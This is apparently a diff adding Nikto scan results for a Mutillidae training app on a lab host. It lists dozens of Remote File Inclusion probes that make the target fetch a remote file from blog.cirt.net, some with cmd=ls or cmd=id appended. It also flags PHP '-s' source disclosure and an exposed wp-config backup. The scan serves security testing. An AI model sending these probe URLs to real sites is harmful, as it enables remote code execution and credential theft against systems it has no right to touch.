+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?file_Nikto[]=http://blog.cirt.net/rfiinc.txt?
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?file_name[]=http://blog.cirt.net/rfiinc.txt?
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?file_path=http://blog.cirt.net/rfiinc.txt?
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?fileloc=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?from=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?func=http://blog.cirt.net/rfiinc.txt?
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?function=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?function=custom&custom=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?gOo=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?gen=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?get=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?home_Nikto=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?home_name=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?ilang=http://blog.cirt.net/rfiinc.txt?
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?inc_dir=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?inc_dir=http://blog.cirt.net/rfiinc.txt?
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?includeDir=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?includeFooter=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?includesdir=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?insPath=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?lang=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?language=http://blog.cirt.net/rfiinc.txt?
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?language=en&main_page=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?lizge=http://blog.cirt.net/rfiinc.txt?&cmd=ls
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?lng=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?load=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?loadpage=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?main_tabid=1&main_content=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?may=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?middle=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?mode=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?mode=http://blog.cirt.net/rfiinc.txt?&cmd=
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?modpath=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?module=PostWrap&page=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?mosConfig_absolute_path=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?news7[unctions\"]=http://blog.cirt.net/rfiinc.txt"
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?news_include_path=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?open=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?option=com_custompages&cpage=http://blog.cirt.net/rfiinc.txt?
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?page=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?page=http://blog.cirt.net/rfiinc.txt%00
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?page=http://blog.cirt.net/rfiinc.txt?
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?pagehttp://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?page[path]=http://blog.cirt.net/rfiinc.txt?&cmd=ls
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?pageNikto=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?pagename=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?pager=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?pagina=http://blog.cirt.net/rfiinc.txt?
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?path_to_folder=http://blog.cirt.net/rfiinc.txt?cmd=id
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?pg=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?pg=http://blog.cirt.net/rfiinc.txt?
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?phpbb_root_path=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?plugin=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?principal=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?proMod=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?proMod=http://blog.cirt.net/rfiinc.txt?cmd
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?project=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?repinc=http://blog.cirt.net/rfiinc.txt?
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?root_prefix=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?root_prefix=http://blog.cirt.net/rfiinc.txt?
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?section=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?site=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?site_path=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?styl[top]=http://blog.cirt.net/rfiinc.txt??
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?template=http://blog.cirt.net/rfiinc.txt?
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?templates_dir=http://blog.cirt.net/rfiinc.txt?
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?theme=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?themepath=http://blog.cirt.net/rfiinc.txt?
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?themesdir=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?this_path=http://blog.cirt.net/rfiinc.txt?
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?txt=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?up=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?url=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?w=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?way=http://blog.cirt.net/rfiinc.txt??????????????
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Admin login page/section found...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Admin login page/section found.
+Method: /mutillidae/login.php
+Details: Admin login page/section found.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] phpMyAdmin directory found...
+Evidence:
+URL: http://192.168.78.102/mutillidae/phpMyAdmin directory found.
+Method: /mutillidae/phpMyAdmin/
+Details: phpMyAdmin directory found.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] PHP allows retrieval of the source code via the -s parameter...
+Evidence:
+URL: http://192.168.78.102/mutillidae/PHP allows retrieval of the source code via the -s parameter, and may allow command execution.
+Method: /mutillidae/?-s
+Details: PHP allows retrieval of the source code via the -s parameter, and may allow command execution.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] PHP allows retrieval of the source code via the -s parameter...
+Evidence:
+URL: http://192.168.78.102/mutillidae/PHP allows retrieval of the source code via the -s parameter, and may allow command execution.
+Method: /mutillidae/login.php?-s
+Details: PHP allows retrieval of the source code via the -s parameter, and may allow command execution.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] #wp-config...
+Evidence:
+URL: http://192.168.78.102/mutillidae/#wp-config.php# file found. This file contains the credentials.
+Method: /mutillidae/#wp-config.php#
+Details: #wp-config.php# file found. This file contains the credentials.
+Remediation: Check server configuration.
+
